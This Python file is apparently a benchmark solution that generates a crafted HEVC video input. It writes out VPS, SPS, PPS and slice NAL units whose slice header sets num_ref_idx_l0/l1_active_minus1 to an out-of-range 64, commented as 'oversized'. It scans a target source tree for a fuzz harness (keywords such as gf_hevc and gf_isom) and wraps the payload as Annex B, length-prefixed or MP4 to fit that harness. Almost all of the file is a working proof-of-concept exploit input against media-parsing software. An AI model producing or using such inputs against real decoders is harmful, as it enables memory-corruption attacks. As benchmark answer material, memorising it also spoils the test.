import os
import re
import struct
import tarfile
from typing import List, Optional, Tuple


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self) -> None:
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bit(self, bit: int) -> None:
        self._cur = (self._cur << 1) | (1 if bit else 0)
        self._nbits += 1
        if self._nbits == 8:
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, value: int, n: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            self.write_bit((value >> i) & 1)

    def write_ue(self, v: int) -> None:
        if v < 0:
            v = 0
        x = v + 1
        nbits = x.bit_length()
        self.write_bits(0, nbits - 1)
        self.write_bits(x, nbits)

    def write_se(self, v: int) -> None:
        if v <= 0:
            code_num = -2 * v
        else:
            code_num = 2 * v - 1
        self.write_ue(code_num)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        if self._nbits != 0:
            self._cur <<= (8 - self._nbits)
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zc = 0
    for b in rbsp:
        if zc >= 2 and b <= 3:
            out.append(0x03)
            zc = 0
        out.append(b)
        if b == 0:
            zc += 1
        else:
            zc = 0
    return bytes(out)


def _hevc_nal_header(nal_unit_type: int, layer_id: int = 0, tid_plus1: int = 1) -> bytes:
    layer_id &= 0x3F
    tid_plus1 &= 0x07
    b0 = ((nal_unit_type & 0x3F) << 1) | ((layer_id >> 5) & 0x01)
    b1 = ((layer_id & 0x1F) << 3) | tid_plus1
    return bytes((b0 & 0xFF, b1 & 0xFF))


def _make_nal(nal_unit_type: int, rbsp: bytes) -> bytes:
    return _hevc_nal_header(nal_unit_type) + _rbsp_to_ebsp(rbsp)


def _profile_tier_level_rbsp(max_sub_layers_minus1: int = 0) -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 2)  # general_profile_space
    bw.write_bit(0)      # general_tier_flag
    bw.write_bits(1, 5)  # general_profile_idc: Main
    bw.write_bits(0, 32)  # general_profile_compatibility_flags
    bw.write_bit(1)  # general_progressive_source_flag
    bw.write_bit(0)  # general_interlaced_source_flag
    bw.write_bit(0)  # general_non_packed_constraint_flag
    bw.write_bit(1)  # general_frame_only_constraint_flag
    bw.write_bits(0, 44)  # general_reserved_zero_44bits
    bw.write_bits(120, 8)  # general_level_idc

    # For max_sub_layers_minus1 == 0, nothing else
    return bw.get_bytes()


def _vps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bit(1)      # vps_base_layer_internal_flag
    bw.write_bit(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits

    # profile_tier_level(1, 0)
    pt = _profile_tier_level_rbsp(0)
    for b in pt:
        bw.write_bits(b, 8)

    bw.write_bit(0)      # vps_sub_layer_ordering_info_present_flag
    bw.write_ue(4)       # vps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)       # vps_max_num_reorder_pics[0]
    bw.write_ue(0)       # vps_max_latency_increase_plus1[0]

    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)       # vps_num_layer_sets_minus1

    bw.write_bit(0)      # vps_timing_info_present_flag
    bw.write_bit(0)      # vps_extension_flag

    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _sps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag

    pt = _profile_tier_level_rbsp(0)
    for b in pt:
        bw.write_bits(b, 8)

    bw.write_ue(0)  # sps_seq_parameter_set_id
    bw.write_ue(1)  # chroma_format_idc (4:2:0)
    bw.write_ue(16)  # pic_width_in_luma_samples
    bw.write_ue(16)  # pic_height_in_luma_samples
    bw.write_bit(0)  # conformance_window_flag
    bw.write_ue(0)   # bit_depth_luma_minus8
    bw.write_ue(0)   # bit_depth_chroma_minus8
    bw.write_ue(4)   # log2_max_pic_order_cnt_lsb_minus4 => 8 bits

    bw.write_bit(0)  # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(4)   # sps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)   # sps_max_num_reorder_pics[0]
    bw.write_ue(0)   # sps_max_latency_increase_plus1[0]

    bw.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)  # max_transform_hierarchy_depth_inter
    bw.write_ue(0)  # max_transform_hierarchy_depth_intra

    bw.write_bit(0)  # scaling_list_enabled_flag
    bw.write_bit(0)  # amp_enabled_flag
    bw.write_bit(0)  # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)  # pcm_enabled_flag

    bw.write_ue(1)  # num_short_term_ref_pic_sets
    # short_term_ref_pic_set(0): one negative pic, used by current
    bw.write_ue(1)  # num_negative_pics
    bw.write_ue(0)  # num_positive_pics
    bw.write_ue(0)  # delta_poc_s0_minus1[0]
    bw.write_bit(1)  # used_by_curr_pic_s0_flag[0]

    bw.write_bit(0)  # long_term_ref_pics_present_flag
    bw.write_bit(0)  # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)  # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.write_bit(0)  # sps_extension_present_flag

    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _pps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # pps_pic_parameter_set_id
    bw.write_ue(0)  # pps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)  # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)  # pps_cb_qp_offset
    bw.write_se(0)  # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # pps_scaling_list_data_present_flag
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)   # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _slice_rbsp(num_ref_idx_minus1: int = 64) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)    # first_slice_segment_in_pic_flag
    bw.write_ue(0)     # slice_pic_parameter_set_id
    bw.write_ue(0)     # slice_type: B=0, P=1, I=2

    bw.write_bits(0, 8)  # slice_pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb = 8)
    bw.write_bit(1)      # short_term_ref_pic_set_sps_flag (use SPS RPS #0)

    # slice_type != I:
    bw.write_bit(1)      # num_ref_idx_active_override_flag
    bw.write_ue(num_ref_idx_minus1)  # num_ref_idx_l0_active_minus1 (oversized)
    bw.write_ue(num_ref_idx_minus1)  # num_ref_idx_l1_active_minus1 (oversized)

    # lists_modification_present_flag == 0 => no ref_pic_list_modification()
    bw.write_bit(0)      # mvd_l1_zero_flag (B slice)
    # cabac_init_present_flag == 0 => absent
    # temporal_mvp disabled => absent
    # weighted_bipred disabled => absent
    bw.write_ue(0)       # five_minus_max_num_merge_cand
    bw.write_se(0)       # slice_qp_delta

    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _annexb_stream(nalus: List[bytes]) -> bytes:
    out = bytearray()
    sc = b"\x00\x00\x00\x01"
    for n in nalus:
        out += sc
        out += n
    return bytes(out)


def _length_prefixed_stream(nalus: List[bytes], length_size: int = 4) -> bytes:
    out = bytearray()
    for n in nalus:
        ln = len(n)
        if length_size == 4:
            out += struct.pack(">I", ln)
        elif length_size == 2:
            out += struct.pack(">H", ln & 0xFFFF)
        elif length_size == 1:
            out.append(ln & 0xFF)
        else:
            out += struct.pack(">I", ln)
        out += n
    return bytes(out)


def _box(typ: bytes, payload: bytes) -> bytes:
    return struct.pack(">I4s", 8 + len(payload), typ) + payload


def _full_box(typ: bytes, version: int, flags: int, payload: bytes) -> bytes:
    return _box(typ, struct.pack(">I", ((version & 0xFF) << 24) | (flags & 0xFFFFFF)) + payload)


def _make_hvcc(config_nals: List[bytes], length_size_minus_one: int = 3) -> bytes:
    # config_nals should include complete NAL units (header+rbsp/ebsp), without start codes/lengths
    # We will place arrays for VPS/SPS/PPS based on NAL types 32/33/34
    nals_by_type = {}
    for n in config_nals:
        if len(n) < 2:
            continue
        nal_type = (n[0] >> 1) & 0x3F
        if nal_type in (32, 33, 34):
            nals_by_type.setdefault(nal_type, []).append(n)

    arrays = []
    for nal_type in (32, 33, 34):
        lst = nals_by_type.get(nal_type, [])
        if not lst:
            continue
        arr_hdr = bytes([(1 << 7) | (nal_type & 0x3F)])  # array_completeness=1, reserved=0, nal_unit_type
        arr = bytearray(arr_hdr)
        arr += struct.pack(">H", len(lst))
        for nal in lst:
            arr += struct.pack(">H", len(nal))
            arr += nal
        arrays.append(bytes(arr))

    num_of_arrays = len(arrays)

    # HEVCDecoderConfigurationRecord (ISO/IEC 14496-15)
    payload = bytearray()
    payload.append(1)  # configurationVersion

    # general_profile_space(2)=0, general_tier_flag(1)=0, general_profile_idc(5)=1
    payload.append((0 << 6) | (0 << 5) | 1)
    payload += struct.pack(">I", 0)  # general_profile_compatibility_flags
    payload += b"\x00\x00\x00\x00\x00\x00"  # general_constraint_indicator_flags (48 bits)
    payload.append(120)  # general_level_idc

    payload += struct.pack(">H", 0xF000 | 0)  # reserved(4)=1111 + min_spatial_segmentation_idc(12)=0
    payload.append(0xFC | 0)  # reserved(6)=111111 + parallelismType(2)=0
    payload.append(0xFC | 1)  # reserved(6)=111111 + chromaFormat(2)=1
    payload.append(0xF8 | 0)  # reserved(5)=11111 + bitDepthLumaMinus8(3)=0
    payload.append(0xF8 | 0)  # reserved(5)=11111 + bitDepthChromaMinus8(3)=0
    payload += struct.pack(">H", 0)  # avgFrameRate

    # constantFrameRate(2)=0, numTemporalLayers(3)=1, temporalIdNested(1)=1, lengthSizeMinusOne(2)=length_size_minus_one
    payload.append(((0 & 0x3) << 6) | ((1 & 0x7) << 3) | ((1 & 0x1) << 2) | (length_size_minus_one & 0x3))

    payload.append(num_of_arrays & 0xFF)
    for a in arrays:
        payload += a

    return _box(b"hvcC", bytes(payload))


def _make_mp4(sample_nals: List[bytes], config_nals: List[bytes]) -> bytes:
    # Build a minimal MP4 with one HEVC video sample.
    # Sample payload: length-prefixed NAL units, 4-byte lengths.
    sample_data = _length_prefixed_stream(sample_nals, 4)

    ftyp = _box(b"ftyp", b"isom" + struct.pack(">I", 0x200) + b"isomiso2mp41")

    # mvhd
    mvhd_payload = bytearray()
    mvhd_payload += struct.pack(">IIII", 0, 0, 1000, 1)  # creation, modification, timescale, duration
    mvhd_payload += struct.pack(">I", 0x00010000)  # rate 1.0
    mvhd_payload += struct.pack(">H", 0x0100)      # volume 1.0
    mvhd_payload += b"\x00\x00"                    # reserved
    mvhd_payload += b"\x00" * 8                    # reserved
    # unity matrix
    mvhd_payload += struct.pack(">9I",
                                0x00010000, 0, 0,
                                0, 0x00010000, 0,
                                0, 0, 0x40000000)
    mvhd_payload += b"\x00" * 24  # pre_defined
    mvhd_payload += struct.pack(">I", 2)  # next_track_ID
    mvhd = _full_box(b"mvhd", 0, 0, bytes(mvhd_payload))

    # tkhd
    tkhd_payload = bytearray()
    tkhd_payload += struct.pack(">IIII", 0, 0, 1, 0)  # creation, modification, track_ID, reserved
    tkhd_payload += struct.pack(">I", 1)  # duration
    tkhd_payload += b"\x00" * 8  # reserved
    tkhd_payload += struct.pack(">HHHH", 0, 0, 0x0100, 0)  # layer, alt_group, volume, reserved
    tkhd_payload += struct.pack(">9I",
                                0x00010000, 0, 0,
                                0, 0x00010000, 0,
                                0, 0, 0x40000000)
    tkhd_payload += struct.pack(">II", 16 << 16, 16 << 16)  # width, height (16.16)
    tkhd = _full_box(b"tkhd", 0, 0x000007, bytes(tkhd_payload))

    # mdhd
    mdhd_payload = struct.pack(">IIIIHH",
                               0, 0, 1000, 1, 0x55C4, 0)  # timescale, duration, language 'und'
    mdhd = _full_box(b"mdhd", 0, 0, mdhd_payload)

    # hdlr (vide)
    hdlr_payload = struct.pack(">I4sIII", 0, b"vide", 0, 0, 0) + b"VideoHandler\x00"
    hdlr = _full_box(b"hdlr", 0, 0, hdlr_payload)

    # vmhd
    vmhd_payload = struct.pack(">HHHH", 0, 0, 0, 0)
    vmhd = _full_box(b"vmhd", 0, 1, vmhd_payload)

    # dinf/dref/url
    url = _full_box(b"url ", 0, 1, b"")
    dref = _full_box(b"dref", 0, 0, struct.pack(">I", 1) + url)
    dinf = _box(b"dinf", dref)

    # stsd with hev1 + hvcC
    hvcc = _make_hvcc(config_nals, 3)

    # VisualSampleEntry 'hev1'
    vse = bytearray()
    vse += b"\x00" * 6
    vse += struct.pack(">H", 1)  # data_reference_index
    vse += struct.pack(">HHIII", 0, 0, 0, 0, 0)  # pre_defined, reserved, pre_defined[3]
    vse += struct.pack(">HH", 16, 16)  # width, height
    vse += struct.pack(">II", 0x00480000, 0x00480000)  # horiz/vert resolution 72 dpi
    vse += struct.pack(">I", 0)  # reserved
    vse += struct.pack(">H", 1)  # frame_count
    vse += bytes([0]) + b"\x00" * 31  # compressorname (32 bytes)
    vse += struct.pack(">H", 0x0018)  # depth
    vse += struct.pack(">H", 0xFFFF)  # pre_defined
    vse += hvcc  # child box

    sample_entry = struct.pack(">I4s", 8 + len(vse), b"hev1") + vse
    stsd = _full_box(b"stsd", 0, 0, struct.pack(">I", 1) + sample_entry)

    # stts: 1 sample, duration 1
    stts = _full_box(b"stts", 0, 0, struct.pack(">I", 1) + struct.pack(">II", 1, 1))

    # stsc: 1 entry
    stsc = _full_box(b"stsc", 0, 0, struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))

    # stsz: one sample size
    stsz = _full_box(b"stsz", 0, 0, struct.pack(">II", 0, 1) + struct.pack(">I", len(sample_data)))

    # stco: placeholder, fill later
    stco_placeholder = _full_box(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", 0))

    stbl = _box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)
    minf = _box(b"minf", vmhd + dinf + stbl)
    mdia = _box(b"mdia", mdhd + hdlr + minf)
    trak = _box(b"trak", tkhd + mdia)
    moov = _box(b"moov", mvhd + trak)

    # mdat
    mdat = _box(b"mdat", sample_data)

    # Now compute real stco offset: it should point to mdat payload start.
    # File layout: ftyp + moov + mdat
    file_prefix = ftyp + moov
    mdat_payload_offset = len(file_prefix) + 8  # skip mdat header
    # Patch stco entry in moov: find 'stco' box location and overwrite offset
    # We'll do a simple search for b"stco" signature and patch at known position (entry offset field).
    # stco box structure: size(4) type(4) version/flags(4) entry_count(4) chunk_offset[0](4)
    moov_bytes = bytearray(moov)
    idx = moov_bytes.find(b"stco")
    if idx != -1:
        # idx points at type; chunk offset is at idx + 4(type) + 4(version/flags) + 4(entry_count) = idx+12
        chunk_off_pos = idx + 4 + 4 + 4
        if 0 <= chunk_off_pos <= len(moov_bytes) - 4:
            moov_bytes[chunk_off_pos:chunk_off_pos + 4] = struct.pack(">I", mdat_payload_offset)

    return bytes(ftyp) + bytes(moov_bytes) + mdat


def _detect_input_type(src_path: str) -> str:
    # returns 'mp4', 'length', or 'annexb'
    def score_text(name: str, text: str) -> int:
        s = 0
        ln = name.lower()
        if "fuzz" in ln:
            s += 2
        if "hevc" in ln or "h265" in ln:
            s += 10
        if "avc" in ln or "h264" in ln:
            s += 2
        if "isom" in ln or "mp4" in ln:
            s += 4
        tl = text.lower()
        if "llvmfuzzertestoneinput" in tl:
            s += 20
        if "hevc" in tl or "h265" in tl:
            s += 10
        if "gf_hevc" in tl:
            s += 8
        if "gf_isom" in tl or "isom" in tl or "mp4" in tl:
            s += 6
        if "annex" in tl or "start code" in tl or "start_code" in tl or "00000001" in tl:
            s += 3
        if "lengthsizeminusone" in tl or "nal_length" in tl or "nal_size" in tl:
            s += 3
        return s

    best: Tuple[int, str] = (-1, "")
    best_text = ""

    if os.path.isdir(src_path):
        total_read = 0
        for root, _, files in os.walk(src_path):
            for fn in files:
                if not fn.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                    continue
                path = os.path.join(root, fn)
                try:
                    st = os.stat(path)
                    if st.st_size > 200_000:
                        continue
                    with open(path, "rb") as f:
                        data = f.read(200_000)
                except Exception:
                    continue
                total_read += len(data)
                if total_read > 5_000_000:
                    break
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" not in txt:
                    continue
                s = score_text(path, txt)
                if s > best[0]:
                    best = (s, path)
                    best_text = txt
            if total_read > 5_000_000:
                break
    else:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                total_read = 0
                for m in tf:
                    if not m.isfile():
                        continue
                    nm = m.name
                    if not nm.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                        continue
                    if m.size > 200_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(200_000)
                    except Exception:
                        continue
                    total_read += len(data)
                    if total_read > 5_000_000:
                        break
                    try:
                        txt = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    if "LLVMFuzzerTestOneInput" not in txt:
                        continue
                    s = score_text(nm, txt)
                    if s > best[0]:
                        best = (s, nm)
                        best_text = txt
        except Exception:
            best_text = ""

    tl = best_text.lower()
    if not tl:
        return "annexb"

    # Prefer mp4 if clearly using isom APIs
    if ("gf_isom" in tl) or ("isom_open" in tl) or ("gf_isom_open" in tl) or ("moov" in tl and "mdat" in tl):
        return "mp4"

    # If explicitly parsing start codes, choose annexb
    if ("annexb" in tl) or ("start_code" in tl) or ("start code" in tl) or ("nalu_next_start_code" in tl) or ("0x00000001" in tl):
        return "annexb"

    # If reading lengths for NAL units, choose length-prefixed
    if ("lengthsizeminusone" in tl) or ("nal_size" in tl) or ("nal_length" in tl) or ("read_u32" in tl and "nal" in tl):
        return "length"

    return "annexb"


class Solution:
    def solve(self, src_path: str) -> bytes:
        vps = _make_nal(32, _vps_rbsp())
        sps = _make_nal(33, _sps_rbsp())
        pps = _make_nal(34, _pps_rbsp())
        slc = _make_nal(1, _slice_rbsp(64))

        fmt = _detect_input_type(src_path)

        if fmt == "mp4":
            # Put parameter sets both in hvcC and in-band to maximize chance of parsing
            return _make_mp4([vps, sps, pps, slc], [vps, sps, pps])

        if fmt == "length":
            return _length_prefixed_stream([vps, sps, pps, slc], 4)

        return _annexb_stream([vps, sps, pps, slc])